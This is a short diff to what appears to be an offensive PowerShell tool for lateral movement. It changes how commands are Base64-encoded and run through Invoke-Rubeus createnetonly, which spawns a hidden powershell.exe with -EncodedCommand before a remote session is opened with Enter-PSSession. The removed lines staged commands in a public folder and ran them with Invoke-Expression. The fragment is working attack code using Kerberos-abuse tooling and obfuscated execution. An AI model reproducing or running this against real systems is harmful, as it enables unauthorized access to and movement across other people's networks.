@@ -255,12 +255,15 @@ Enter-PSSession -ComputerName $FQDNHostname
 		break
 	}
 	
-	$commands | Out-File "C:\Users\Public\Documents\comm.txt"
-	$finalcommand = '$comm = Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw;Remove-Item -Path C:\Users\Public\Documents\comm.txt;Invoke-Expression($comm)'
-	
-	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))	
+	#$commands | Out-File "C:\Users\Public\Documents\comm.txt"
+	#$finalcommand = '$comm = Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw;Remove-Item -Path C:\Users\Public\Documents\comm.txt;Invoke-Expression($comm)'
+	#$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
+
+	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+  	
 	Invoke-Rubeus createnetonly /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /show > $null
-	Write-Output ""
+	
+ 	Write-Output ""
 	Write-Output "Attempting to access the remote machine..."
 	Write-Output ""
 }
